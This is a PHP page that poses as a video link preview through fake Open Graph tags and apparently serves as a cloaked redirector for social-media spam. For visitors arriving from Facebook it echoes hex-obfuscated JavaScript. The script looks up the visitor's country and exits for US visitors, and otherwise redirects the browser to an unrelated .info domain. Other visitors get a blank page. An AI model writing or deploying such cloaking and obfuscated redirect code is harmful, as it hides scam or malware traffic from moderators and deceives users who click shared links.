<?php
  function md5rand($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="0123456789";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val) 
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }
      function shkronja($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val)
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }



    ?>
      <meta name="referrer" content="origin" />

        <meta property="og:title" content="<?php echo shkronja(10); ?>" />
        <meta property="og:type" content="video.movie" />
         <meta property="og:image" content="'.$_GET["imagex"].'"/>

<?php

{
$randval = rand();
if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {
  

  if (strpos($_SERVER["REQUEST_URI"], 'sanx0') !== false){
  echo '<script>
var _0x8fa3=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x64\x61\x6B\x6F\x7A\x69\x62\x69\x6C\x75\x6A\x75\x6A\x2E\x69\x6E\x66\x6F","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x8fa3[2]](_0x8fa3[0],_0x8fa3[1],false);xmlhttpz[_0x8fa3[3]]();var get=JSON[_0x8fa3[5]](xmlhttpz[_0x8fa3[4]]);var country=get[_0x8fa3[7]][_0x8fa3[6]];if(country== _0x8fa3[8]){exit}else {top[_0x8fa3[10]][_0x8fa3[9]]= _0x8fa3[11]+ Math[_0x8fa3[13]](Math[_0x8fa3[12]]()* 99999999)}  </script>';
  } else {
    

echo '<script>
var _0xb9fc=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x64\x61\x6B\x6F\x7A\x69\x62\x69\x6C\x75\x6A\x75\x6A\x2E\x69\x6E\x66\x6F"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0xb9fc[2]](_0xb9fc[0],_0xb9fc[1],false);xmlhttpz[_0xb9fc[3]]();var get=JSON[_0xb9fc[5]](xmlhttpz[_0xb9fc[4]]);var country=get[_0xb9fc[7]][_0xb9fc[6]];if(country== _0xb9fc[8]){exit}else {top[_0xb9fc[10]][_0xb9fc[9]]= _0xb9fc[11]}
</script>';

  }
}




else {
     //Google brought me to this page.
    //header("Location: https://facebook.com/search?q=".$randval);
   exit();
}  }


?>
